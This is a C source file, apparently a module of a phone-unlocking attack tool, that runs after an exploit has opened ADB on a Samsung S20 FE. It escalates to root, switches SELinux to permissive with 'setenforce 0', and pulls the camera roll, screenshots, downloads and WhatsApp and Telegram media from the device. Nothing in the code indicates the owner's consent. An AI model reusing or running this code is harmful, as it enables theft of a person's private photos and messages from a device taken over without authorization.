#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>
#include "sampass.h"

/*
 * ADB PHOTO EXTRACTION MODULE
 *
 * After any exploit path achieves ADB access (USB kernel exploit,
 * EDL/PBL chain, or PACM token authentication), this module
 * automates photo extraction from the Samsung S20 FE.
 */

static char *run_cmd(const char *cmd)
{
    FILE *fp = popen(cmd, "r");
    if (!fp) return NULL;

    size_t cap = 4096;
    char *buf = malloc(cap);
    if (!buf) { pclose(fp); return NULL; }

    size_t len = 0;
    size_t n;
    while ((n = fread(buf + len, 1, cap - len - 1, fp)) > 0) {
        len += n;
        if (len >= cap - 1) {
            cap *= 2;
            char *tmp = realloc(buf, cap);
            if (!tmp) break;
            buf = tmp;
        }
    }
    buf[len] = '\0';
    pclose(fp);
    return buf;
}

static bool adb_available(void)
{
    char *out = run_cmd("adb devices 2>/dev/null");
    if (!out) return false;

    /* look for a device line (not just the header) */
    const char *nl = strchr(out, '\n');
    bool found = false;
    if (nl) {
        nl++;
        while (*nl == '\n') nl++;
        if (*nl && strstr(nl, "\tdevice"))
            found = true;
    }
    free(out);
    return found;
}

static int pull_dir(const char *remote, const char *local_base, const char *subdir)
{
    char local[512];
    char cmd[1024];

    snprintf(local, sizeof(local), "%s/%s", local_base, subdir);
    mkdir(local, 0755);

    printf("  " CLR_CYAN "%-40s" CLR_RESET " -> %s/\n", remote, subdir);

    snprintf(cmd, sizeof(cmd), "adb pull \"%s\" \"%s\" 2>&1", remote, local);
    char *out = run_cmd(cmd);
    if (out) {
        /* count "pulled" lines */
        int count = 0;
        const char *p = out;
        while ((p = strstr(p, " pulled")) != NULL) {
            count++;
            p += 7;
        }
        if (count > 0)
            printf("    " CLR_GREEN "%d files pulled" CLR_RESET "\n", count);
        else if (strstr(out, "does not exist"))
            printf("    " CLR_DIM "(not found)" CLR_RESET "\n");
        else if (strstr(out, "0 files pulled"))
            printf("    " CLR_DIM "(empty)" CLR_RESET "\n");
        else
            printf("    " CLR_YELLOW "%s" CLR_RESET "\n", out);
        free(out);
    }
    return 0;
}

int adb_pull_photos(const char *output_dir)
{
    const char *dir = output_dir ? output_dir : "./extracted_photos";

    print_section_header("ADB PHOTO EXTRACTION");

    printf("  " CLR_BOLD "Output:" CLR_RESET " %s/\n\n", dir);

    /* wait for ADB device */
    if (!adb_available()) {
        printf("  " CLR_YELLOW "Waiting for ADB device..." CLR_RESET "\n");
        printf("  " CLR_DIM "(Connect device with ADB enabled, or wait for exploit to enable it)" CLR_RESET "\n\n");

        int waited = 0;
        while (!adb_available() && waited < 120) {
            sleep(2);
            waited += 2;
            if (waited % 10 == 0)
                printf("  " CLR_DIM "  Still waiting... %ds" CLR_RESET "\n", waited);
        }

        if (!adb_available()) {
            color_print(CLR_RED, "  No ADB device found after 120 seconds.\n");
            printf("  Ensure the device has ADB enabled and is authorized.\n\n");
            return 1;
        }
    }

    printf("  " CLR_GREEN "ADB device connected!" CLR_RESET "\n\n");

    /* try root escalation */
    printf("  " CLR_BOLD "Escalating privileges..." CLR_RESET "\n");
    char *root_out = run_cmd("adb root 2>&1");
    if (root_out) {
        if (strstr(root_out, "adbd is already running as root") ||
            strstr(root_out, "restarting adbd as root"))
            printf("    " CLR_GREEN "Running as root" CLR_RESET "\n");
        else
            printf("    " CLR_YELLOW "Root: %s" CLR_RESET "\n", root_out);
        free(root_out);
        sleep(2);
    }

    /* disable SELinux */
    char *se_out = run_cmd("adb shell getenforce 2>&1");
    if (se_out) {
        if (strstr(se_out, "Enforcing")) {
            free(se_out);
            se_out = run_cmd("adb shell setenforce 0 2>&1");
            if (se_out) {
                printf("    " CLR_GREEN "SELinux set to Permissive" CLR_RESET "\n");
                free(se_out);
            }
        } else {
            printf("    " CLR_GREEN "SELinux: %s" CLR_RESET, se_out);
            free(se_out);
        }
    }

    /* get device info */
    printf("\n  " CLR_BOLD "Device:" CLR_RESET "\n");
    char *model = run_cmd("adb shell getprop ro.product.model 2>/dev/null");
    char *patch = run_cmd("adb shell getprop ro.build.version.security_patch 2>/dev/null");
    if (model) { model[strcspn(model, "\r\n")] = '\0'; printf("    Model:  %s\n", model); free(model); }
    if (patch) { patch[strcspn(patch, "\r\n")] = '\0'; printf("    Patch:  %s\n", patch); free(patch); }

    /* create output directory */
    mkdir(dir, 0755);

    /* pull photo directories */
    printf("\n  " CLR_BOLD "Extracting files:" CLR_RESET "\n\n");

    pull_dir("/data/media/0/DCIM/Camera/",   dir, "Camera");
    pull_dir("/data/media/0/DCIM/Screenshots/", dir, "Screenshots");
    pull_dir("/data/media/0/Pictures/",       dir, "Pictures");
    pull_dir("/data/media/0/Download/",       dir, "Downloads");
    pull_dir("/data/media/0/Movies/",         dir, "Movies");
    pull_dir("/data/media/0/Android/media/com.whatsapp/WhatsApp/Media/", dir, "WhatsApp");
    pull_dir("/data/media/0/Telegram/",       dir, "Telegram");

    /* summary */
    printf("\n");
    print_section_header("EXTRACTION SUMMARY");

    char count_cmd[512];
    snprintf(count_cmd, sizeof(count_cmd), "find \"%s\" -type f 2>/dev/null | wc -l", dir);
    char *count = run_cmd(count_cmd);

    char size_cmd[512];
    snprintf(size_cmd, sizeof(size_cmd), "du -sh \"%s\" 2>/dev/null | cut -f1", dir);
    char *size = run_cmd(size_cmd);

    printf("  " CLR_BOLD "Files:" CLR_RESET "  %s", count ? count : "unknown");
    printf("  " CLR_BOLD "Size:" CLR_RESET "   %s", size ? size : "unknown");
    printf("  " CLR_BOLD "Output:" CLR_RESET " %s/\n\n", dir);

    if (count) free(count);
    if (size) free(size);

    printf("  " CLR_GREEN "Extraction complete." CLR_RESET "\n\n");
    return 0;
}
